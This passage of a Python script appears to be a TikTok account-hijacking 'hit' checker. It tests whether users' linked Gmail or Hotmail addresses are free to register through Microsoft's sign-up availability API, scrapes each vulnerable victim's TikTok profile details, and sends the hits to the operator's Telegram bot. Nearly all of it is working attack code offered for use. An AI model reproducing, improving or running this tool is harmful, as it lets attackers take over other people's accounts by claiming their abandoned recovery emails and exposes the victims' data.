  'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
}
        json_data = {
  'signInName': email+'@hotmail.com'
}
        response = requests.post('https://signup.live.com/API/CheckAvailableSigninNames', cookies=cookies, headers=headers, json=json_data).text
        if '"isAvailable":true' in response:
            return True
        else:
            return False  
      except Exception as e:''
#      	print(f'{e}')
  def info(self,username,xx):
    try:
      if username in self.hits:
        return
      self.hits.append(username)
      inf=self.information(username)
      if xx =='1':
        username = username+'@gmail.com'
      elif xx =='2':
        username = username+'@hotmail.com'
      else:
        pass
      nn = random.choice(col)
      ff = (f'''
꧁[HIT TIK BY  -  𝙈𝙊𝙍𝙏𝘼𝘿𝘼]꧂ 
★★★★★★★★★★★★★★★★★★★
|•> Name : {inf['name']}
|•> Email : {username}
|•> Followers : {inf['followers']}
|•> Following : {inf['following']}
|•> Likes : {inf['like']}
|•> User ID : {inf['id']}
|•> Private : {inf['private']}
|•> video : {inf['video']}
★★★★★★★★★★★★★★★★★★★
|> @M_R_Q_P  -  𝙈𝙊𝙍𝙏𝘼𝘿𝘼
★★★★★★★★★★★★★★★★★★★
     ''')

      print(nn,ff)

    except:      
      ff=f'''
ماكو معلومات 
★★★★★★★★★★★★★★★★★★★      
|•> Email : {username}
★★★★★★★★★★★★★★★★★★★
|> @M_R_Q_P  -  𝙈𝙊𝙍𝙏𝘼𝘿𝘼
★★★★★★★★★★★★★★★★★★★
      '''
    while True:
      try:
        get('https://api.telegram.org/bot'+self.token+'/sendMessage?chat_id='+self.id+'&text='+ff)
        return
      except Exception as e:''     
  def information(self,username):
    try:
        headers = {
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Android 10; Pixel 3 Build/QKQ1.200308.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/125.0.6394.70 Mobile Safari/537.36 trill_350402 JsSdk/1.0 NetType/MOBILE Channel/googleplay AppName/trill app_version/35.3.1 ByteLocale/en ByteFullLocale/en Region/IN AppId/1180 Spark/1.5.9.1 AppVersion/35.3.1 BytedanceWebview/d8a21c6",
            }

        try:
            tikinfo = get(f'https://www.tiktok.com/@{username}', headers=headers).text            
            info = str(tikinfo.split('webapp.user-detail"')[1]).split('"RecommendUserList"')[0]
            try:
                name = str(info.split('nickname":"')[1]).split('",')[0]
            except:
                name = ""
            try:
                followers = str(info.split('followerCount":')[1]).split(',"')[0]
            except:
                followers = ""
            try:
                following = str(info.split('followingCount":')[1]).split(',"')[0]
            except:
                following = ""
            try:
                like = str(info.split('heart":')[1]).split(',"')[0]
            except:
                like = ""
            try:
                video = str(info.split('videoCount":')[1]).split(',"')[0]
            except:
                video = ""
            try:
                id = str(info.split('id":"')[1]).split('",')[0]
            except:
                id = ""                
            try:
                bio = str(info.split('signature":"')[1]).split('",')[0]
            except:
                bio = ""
            try:
                country = str(info.split('region":"')[1]).split('",')[0]
            except:
                country = ""
            try:
                private = str(info.split('privateAccount":')[1]).split(',"')[0]
            except:
                private = ""                            
            return {                                    
                "name": name,
                "username": username,
                "followers": followers,
                "following": following,
                "like": like,
                "video": video,
                "private": private,
                "id": id,
                "bio": bio,
                "BY": "@g_4_q"
            }
        except:
          return {                                    
              "name": '',
              "username": '',
              "followers": '',
              "following": '',
              "like": '',
              "video": '',
              "private": '',
              "id": '',
              "bio": '',
              "BY": "@g_4_q"
          }
    except :
        return {                                    
            "name": '',
            "username": '',
            "followers": '',
            "following": '',
            "like": '',
            "video": '',
            "private": '',
            "id": '',
            "bio": '',
            "BY": "@g_4_q"
        }


  def home(self,xx):
    while True:
      try:
        os.system('cls' if os.name == 'nt' else 'clear')
        print(f'''{X} - HIT {self.good_gmail} | Good TIKTOK {self.good_tiktok} | Bad TIKTOK {self.bad_tiktok} | Bad EMAIL {self.bad_gmail}''')
  
        usernames=self.get_users()
        for username in usernames:
          email=username+'@gmail.com'
          if xx =='1':
             if True == self.check_linked(email):
                self.good_tiktok+=1
                if True == self.check_gmail(username):
                    self.good_gmail+=1
                    self.info(username,xx)
                else:
                    self.bad_gmail+=1          	 		
             else:
                self.bad_tiktok+=1          	 	         	 	
          elif xx =='2':
            email = username+'@hotmail.com'          	
            if True == self.check_linked(email):
                self.good_tiktok+=1
                if True == self.check_hotmail(username):
                    self.good_gmail+=1
                    self.info(username,xx)
                else:
                    self.bad_gmail+=1                    			
            else:
                self.bad_tiktok+=1

          else:
             exit()
             os.system('cls' if os.name == 'nt' else 'clear')
          print(f'''{X} - HIT {self.good_gmail} | Good TIKTOK {self.good_tiktok} | Bad TIKTOK {self.bad_tiktok} | Bad EMAIL {self.bad_gmail}''')
          
      except Exception as e:''
#        print(f'{e}')
        #  print(str(e))

usercode=1010101010100010100101000101010+6093475982

mortada()